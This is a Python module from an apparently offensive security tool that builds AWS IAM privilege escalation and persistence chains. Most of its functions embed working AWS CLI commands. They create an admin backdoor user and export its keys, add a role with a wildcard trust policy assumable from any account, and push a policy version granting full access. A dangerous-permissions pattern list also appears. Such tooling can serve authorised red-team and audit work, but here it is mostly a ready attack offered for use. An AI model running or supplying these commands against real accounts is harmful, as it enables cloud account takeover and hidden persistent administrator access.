"""AWS IAM privilege escalation and backdoor techniques."""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

from kubexhunt.core.graph import RelationType
from kubexhunt.exploit.chain_generator import ExploitChain, ExploitFramework, ExploitStep


@dataclass
class IAMEscalationPath:
    """AWS IAM escalation path from role to admin."""

    start_role: str
    escalation_steps: list[str] = field(default_factory=list)
    final_access: str = "AdministratorAccess"
    technique_id: str = ""
    mitre_techniques: list[str] = field(default_factory=list)
    complexity: str = "MEDIUM"  # TRIVIAL, EASY, MEDIUM, HARD

    def to_dict(self) -> dict[str, Any]:
        """Serialize to dict."""
        return {
            "start_role": self.start_role,
            "escalation_steps": self.escalation_steps,
            "final_access": self.final_access,
            "technique_id": self.technique_id,
            "mitre_techniques": self.mitre_techniques,
            "complexity": self.complexity,
        }


class AWSIAMAttacker:
    """AWS IAM privilege escalation and backdoor generation."""

    def enumerate_escalation_paths(self, role_name: str) -> list[IAMEscalationPath]:
        """Find escalation paths for given IAM role.

        Args:
            role_name: Starting IAM role name

        Returns:
            List of escalation paths from role to admin
        """
        paths = []

        # Path 1: iam:CreatePolicyVersion on managed policy
        paths.append(
            IAMEscalationPath(
                start_role=role_name,
                escalation_steps=[
                    "iam:CreatePolicyVersion",
                    "iam:SetDefaultPolicyVersion",
                ],
                final_access="AdministratorAccess",
                technique_id="AWS-ESC-001",
                mitre_techniques=["T1098.004"],  # Create IAM user/role/policy
                complexity="EASY",
            )
        )

        # Path 2: iam:PassRole + ec2:RunInstances
        paths.append(
            IAMEscalationPath(
                start_role=role_name,
                escalation_steps=[
                    "iam:PassRole (to EC2 instance role)",
                    "ec2:RunInstances",
                    "ec2:AssociateIamInstanceProfile",
                ],
                final_access="EC2 instance with admin role",
                technique_id="AWS-ESC-002",
                mitre_techniques=["T1098.002"],  # Account Manipulation
                complexity="MEDIUM",
            )
        )

        # Path 3: lambda:UpdateFunctionCode + lambda:InvokeFunction
        paths.append(
            IAMEscalationPath(
                start_role=role_name,
                escalation_steps=[
                    "lambda:UpdateFunctionCode",
                    "lambda:InvokeFunction",
                ],
                final_access="Lambda execution role",
                technique_id="AWS-ESC-003",
                mitre_techniques=["T1195.001"],  # Supply Chain Compromise
                complexity="MEDIUM",
            )
        )

        return paths

    def generate_backdoor_user_chain(self, role_name: str = "compromised-role") -> ExploitChain:
        """Generate chain to create backdoor IAM user.

        Args:
            role_name: Starting role with create/attach permissions

        Returns:
            ExploitChain to create persistent backdoor IAM user
        """
        steps = [
            ExploitStep(
                step_number=1,
                relation=RelationType.CAN_CREATE_IAM_BACKDOOR,
                from_node=f"iam:role:{role_name}",
                to_node="iam:backdoor-user",
                framework=ExploitFramework.BASH,
                command="""
# Create backdoor IAM user
aws iam create-user --user-name attacker-backdoor-user

# Create access key
aws iam create-access-key --user-name attacker-backdoor-user \\
  --output json > /tmp/backdoor_creds.json

# Attach AdministratorAccess
aws iam attach-user-policy --user-name attacker-backdoor-user \\
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
""",
                description="Create backdoor IAM user with admin access",
                mitre_techniques=["T1098.001"],  # Create Account
            ),
            ExploitStep(
                step_number=2,
                relation=RelationType.CAN_CREATE_IAM_BACKDOOR,
                from_node="iam:backdoor-user",
                to_node="aws:admin-access",
                framework=ExploitFramework.BASH,
                command="""
# Persistent backdoor: MFA device can be bypassed
# Or use access key for programmatic access

export AWS_ACCESS_KEY_ID=$(jq -r '.AccessKeyId' /tmp/backdoor_creds.json)
export AWS_SECRET_ACCESS_KEY=$(jq -r '.SecretAccessKey' /tmp/backdoor_creds.json)

# Verify backdoor works
aws iam list-users
aws iam get-user --user-name attacker-backdoor-user
""",
                description="Verify backdoor IAM user has admin access",
                mitre_techniques=["T1098.001"],
            ),
        ]

        chain = ExploitChain(
            path_id="AWS-BACKDOOR-001",
            nodes=[f"iam:role:{role_name}", "iam:backdoor-user", "aws:admin-access"],
            steps=steps,
            title="AWS Backdoor IAM User",
            description="Create persistent backdoor IAM user with administrator access",
            complexity="TRIVIAL",
            estimated_time_minutes=2,
        )

        return chain

    def generate_backdoor_role_chain(self, role_name: str = "compromised-role") -> ExploitChain:
        """Generate chain to create backdoor IAM role.

        Args:
            role_name: Starting role with create/attach permissions

        Returns:
            ExploitChain to create backdoor IAM role
        """
        steps = [
            ExploitStep(
                step_number=1,
                relation=RelationType.CAN_CREATE_IAM_BACKDOOR,
                from_node=f"iam:role:{role_name}",
                to_node="iam:backdoor-role",
                framework=ExploitFramework.BASH,
                command="""
# Create backdoor role with permissive trust policy
cat > /tmp/trust-policy.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": "*",
      "Action": "sts:AssumeRole"
    }
  ]
}
EOF

aws iam create-role --role-name attacker-backdoor-role \\
  --assume-role-policy-document file:///tmp/trust-policy.json

# Attach AdministratorAccess
aws iam attach-role-policy --role-name attacker-backdoor-role \\
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
""",
                description="Create backdoor role with wildcard trust and admin perms",
                mitre_techniques=["T1098.001"],
            ),
            ExploitStep(
                step_number=2,
                relation=RelationType.CAN_CREATE_IAM_BACKDOOR,
                from_node="iam:backdoor-role",
                to_node="aws:cross-account-access",
                framework=ExploitFramework.BASH,
                command="""
# From any AWS account, assume the backdoor role
aws sts assume-role --role-arn arn:aws:iam::VICTIM_ACCOUNT:role/attacker-backdoor-role \\
  --role-session-name backdoor-session
""",
                description="Assume backdoor role from any account",
                mitre_techniques=["T1550.001"],  # Use Alternate Authentication Material
            ),
        ]

        chain = ExploitChain(
            path_id="AWS-BACKDOOR-002",
            nodes=[f"iam:role:{role_name}", "iam:backdoor-role", "aws:cross-account-access"],
            steps=steps,
            title="AWS Backdoor IAM Role",
            description="Create backdoor IAM role assumable from external accounts",
            complexity="EASY",
            estimated_time_minutes=3,
        )

        return chain

    def find_high_risk_permissions(self, role_policies: list[str]) -> list[str]:
        """Identify dangerous IAM permissions in role.

        Args:
            role_policies: List of policy ARNs/names attached to role

        Returns:
            List of high-risk permissions found
        """
        dangerous_patterns = [
            "iam:*",
            "iam:CreateAccessKey",
            "iam:AttachUserPolicy",
            "iam:AttachRolePolicy",
            "iam:PutUserPolicy",
            "iam:PutRolePolicy",
            "iam:PassRole",
            "ec2:RunInstances",
            "lambda:InvokeFunction",
            "lambda:UpdateFunctionCode",
            "cloudformation:CreateStack",
            "s3:*",
        ]

        found_dangerous = []
        for pattern in dangerous_patterns:
            if any(pattern.lower() in p.lower() for p in role_policies):
                found_dangerous.append(pattern)

        return found_dangerous

    def generate_policy_version_escalation(self) -> ExploitChain:
        """Generate privilege escalation via policy version manipulation.

        Returns:
            ExploitChain to escalate via CreatePolicyVersion
        """
        steps = [
            ExploitStep(
                step_number=1,
                relation=RelationType.CAN_CREATE_IAM_BACKDOOR,
                from_node="iam:limited-role",
                to_node="iam:admin-policy-version",
                framework=ExploitFramework.BASH,
                command="""
# Create new policy version with admin permissions
cat > /tmp/admin-policy.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "*",
    "Resource": "*"
  }]
}
EOF

aws iam create-policy-version --policy-arn arn:aws:iam::ACCOUNT:policy/managed-policy \\
  --policy-document file:///tmp/admin-policy.json \\
  --set-as-default
""",
                description="Create new admin policy version and set as default",
                mitre_techniques=["T1098.004"],
            )
        ]

        chain = ExploitChain(
            path_id="AWS-BACKDOOR-003",
            nodes=["iam:limited-role", "iam:admin-policy-version"],
            steps=steps,
            title="AWS Policy Version Escalation",
            description="Escalate privileges by creating new policy version with admin perms",
            complexity="EASY",
            estimated_time_minutes=2,
        )

        return chain
